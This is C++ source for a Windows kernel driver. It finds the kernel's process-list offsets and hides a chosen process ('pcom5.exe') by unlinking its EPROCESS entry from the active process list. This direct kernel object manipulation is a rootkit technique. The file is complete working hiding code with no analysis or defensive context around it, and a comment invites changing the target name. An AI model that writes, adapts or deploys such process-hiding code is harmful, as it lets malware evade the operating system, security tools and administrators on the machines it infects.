#include <ntddk.h>
#include <ntstrsafe.h>
#include "Offset.h"
#include "Hide.h"

extern "C"
static ULONG pidOffset = 0, nameOffset = 0, listEntryOffset = 0;

extern "C"
BOOLEAN InitializeOffsets()
{

	nameOffset = CalcProcessNameOffset();
	pidOffset = CalcPIDOffset();					// PID
	listEntryOffset = pidOffset + sizeof(HANDLE);	// LIST_ENTRY

	if (pidOffset == 0 || nameOffset == 0)
		return FALSE;
	else
	{
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "NameOffset Address: 0x%X\n", nameOffset);
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "PID Address: 0x%X\n", pidOffset);
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "ListEntry Address: 0x%X\n", listEntryOffset);
		return TRUE;
	}
}

extern "C"
VOID HideProcess()
{
	PLIST_ENTRY head, currentNode, prevNode;
	PEPROCESS eprocessStart;
	unsigned char* currentProcess = NULL;
	const char target[] = "pcom5.exe"; // Change Name of Process to Usermode Process...
	ANSI_STRING targetProcessName, currentProcessName;

	eprocessStart = IoGetCurrentProcess();
	head = currentNode = (PLIST_ENTRY)((unsigned char*)eprocessStart + listEntryOffset);
	RtlInitAnsiString(&targetProcessName, target);

	do
	{
		currentProcess = (unsigned char*)((unsigned char*)currentNode - listEntryOffset);
		RtlInitAnsiString(&currentProcessName, (const char*)((unsigned char*)currentProcess + nameOffset));

		//DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Process String: %s\n", currentProcessName.Buffer);
		//DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Target Process: %s\n", targetProcessName.Buffer);
		if (RtlCompareString(&targetProcessName, &currentProcessName, TRUE) == 0)
		{
			//DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "Found target process %s.\n", target);

			// (A->B->C->) to (A->C)
			prevNode = currentNode->Blink;
			prevNode->Flink = currentNode->Flink;

			// (A<-B<-C<-) to (A<-C)
			currentNode->Flink->Blink = prevNode;

			// TargetProcess
			currentNode->Flink = currentNode;
			currentNode->Blink = currentNode;
			break;
		}

		currentNode = currentNode->Flink;
	} while (currentNode->Flink != head);
	// EPROCESS
}